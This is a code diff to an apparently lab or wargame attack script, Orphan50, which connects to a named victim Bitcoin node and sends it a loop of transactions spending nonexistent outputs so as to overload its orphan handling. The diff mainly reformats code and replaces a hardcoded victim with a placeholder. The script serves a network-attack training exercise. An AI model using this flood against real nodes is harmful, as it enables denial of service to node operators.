@@ -12,10 +12,11 @@ from test_framework.messages import (
     CTransaction,
     CTxOut,
     CTxIn,
-    COutPoint
+    COutPoint,
 )
 from test_framework.script import CScript
 from test_framework.p2p import MAGIC_BYTES, P2PInterface
+
 
 def get_signet_network_magic_from_node(node):
     template = node.getblocktemplate({"rules": ["segwit", "signet"]})
@@ -48,7 +49,7 @@ class Orphan50(Commander):
         # We pick a node on the network to attack
         # We know this one is vulnderable to 50 orphans based on it's subver
         # Change this to your teams colour if running in the battleground
-        victim = "tank-0002-red.default.svc"
+        victim = "TARGET_TANK_NAME.default.svc"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -71,11 +72,12 @@ class Orphan50(Commander):
         )()
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
-
         for i in range(100):
             # make a transaction that spends an output that doesn't exist
             tx = CTransaction()
-            tx.vout.append(CTxOut(100000000, CScript(bytes.fromhex('0014' + ('00' * 20)))))
+            tx.vout.append(
+                CTxOut(100000000, CScript(bytes.fromhex("0014" + ("00" * 20))))
+            )
             tx.vin.append(CTxIn(COutPoint(random.randint(1, int(1e64)), 0)))
             tx.calc_sha256()
 
